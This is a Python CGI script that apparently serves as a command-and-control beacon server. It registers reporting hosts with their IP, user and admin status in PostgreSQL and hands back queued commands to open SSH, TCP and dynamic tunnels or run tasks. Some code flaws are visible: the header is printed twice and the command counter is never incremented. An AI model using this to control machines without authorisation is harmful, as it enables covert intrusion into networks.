#!/usr/bin/python
import cgi, cgitb
from xml.etree import ElementTree
import psycopg2
import sys
import logging

from db_connection import get_db_connection

# Configure logging to file
logging.basicConfig(
    filename='/var/log/lighttpd/error.log',
    level=logging.DEBUG,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Also log to stderr (captured by lighttpd)
stderr_handler = logging.StreamHandler(sys.stderr)
stderr_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
stderr_handler.setFormatter(formatter)
logging.getLogger().addHandler(stderr_handler)

# Enable CGI debugging to file
cgitb.enable(display=0, logdir='/var/log/lighttpd')

def send_xml_response(content, status_code=200):
    """Send XML response with proper headers"""
    if status_code != 200:
        print(f"Status: {status_code}")
    print("Content-Type: application/xml\n")
    print(content)

def send_error(log_message="Request failed", client_message="Request failed", status_code=400):
    """Send error response as XML with generic client message"""
    logging.error(log_message)
    send_xml_response(f"<Error>{client_message}</Error>", status_code)
    sys.exit(1)

def map_command(command):
    if command == "opensshtunnel":
        return "OpenSSHTunnel"
    if command == "closesshtunnel":
        return "CloseSSHTunnel"
    if command == "opentcptunnel":
        return "OpenTCPTunnel"
    if command == "closetcptunnel":
        return "CloseTCPTunnel"
    if command == "opendynamictunnel":
        return "OpenDynamicTunnel"
    if command == "task":
        return "Task"
    
def commands_to_xml_string(commands):
    root = ElementTree.Element("Beacon")
    cnt = 1
    for command in commands:
        ElementTree.SubElement(root, "Command"+str(cnt)).text = map_command(command[1])
        ElementTree.SubElement(root, "Command"+str(cnt)+"Param").text = "L"+str(command[2])+"R"+str(command[3])
    
    return ElementTree.tostring(root).decode()


try:
    # Print HTTP headers first
    print("Content-Type: application/xml\n")
    
    # Parse form data
    form = cgi.FieldStorage()
    if "info" not in form:
        send_error("Missing info field in request", "Invalid request data", 400)
    
    info = form["info"].value
    
    # Parse and validate XML
    try:
        rootElement = ElementTree.fromstring(info)
    except ElementTree.ParseError as e:
        send_error(f"Invalid XML: {str(e)}", "Invalid request format")
    
    # Extract required fields with validation
    internal_ip = rootElement.find("InternalIP")
    host_name = rootElement.find("HostName")
    current_user = rootElement.find("CurrentUser")
    admin = rootElement.find("Admin")
    ping_interval = rootElement.find("PingInterval")
    
    if any(x is None for x in [internal_ip, host_name, current_user, admin, ping_interval]):
        logging.warning("Missing required XML fields")
        send_error("Missing required XML fields in beacon data", "Invalid request data", 400)
    
    internal_ip = internal_ip.text
    host_name = host_name.text
    current_user = current_user.text
    admin = admin.text
    update_interval = ping_interval.text

    db_connection = None
    db_cursor = None
    
    # Connect to database
    try:
        db_connection = get_db_connection()
        db_cursor = db_connection.cursor()
        db_cursor.execute("""select * from clients where hostname = %s and internalip = %s and currentuser = %s and admin = %s""", (host_name, internal_ip, current_user, admin))
        
        rows = db_cursor.fetchall()
        
        if not rows:
            db_cursor.execute("""insert into clients (hostname, internalip, currentuser, admin, lastping, pinginterval) values (%s, %s, %s, %s, NOW(), %s)""",
                (host_name, internal_ip, current_user, admin, update_interval))
            db_connection.commit()
        else:
            for row in rows:
                db_cursor.execute("update clients set lastping = NOW() where id = %s", (str(row[0]),))
                db_connection.commit()
        
                if (update_interval != row[5]):
                    db_cursor.execute("update clients set pinginterval = %s where id = %s", (update_interval, str(row[0])))
                    db_connection.commit()
        
                db_cursor.execute("select id, cmd, local_port, remote_port from commands where clients_id = %s and released = true and executed = false and marked_as_deleted = false", (str(row[0]),))
                commands = db_cursor.fetchall()
                commands_xml_tree = commands_to_xml_string(commands)
                print(commands_xml_tree)
                for command in commands:
                    db_cursor.execute("update commands set executed = true where id = %s", (command[0],))
                
                db_connection.commit()
    except (ValueError, KeyError, psycopg2.Error) as e:
        logging.error(f"Database connection failed: {str(e)}", exc_info=True)
        send_error("Database connection failed", "Service temporarily unavailable", 500)
        # Query existing client
    finally:
        if db_cursor is not None:
            db_cursor.close()
        if db_connection is not None:
            db_connection.close()

except Exception as e:
    logging.error(f"Unexpected error: {str(e)}", exc_info=True)
    send_xml_response("<Error>An error occurred while processing your request</Error>", status_code=500)        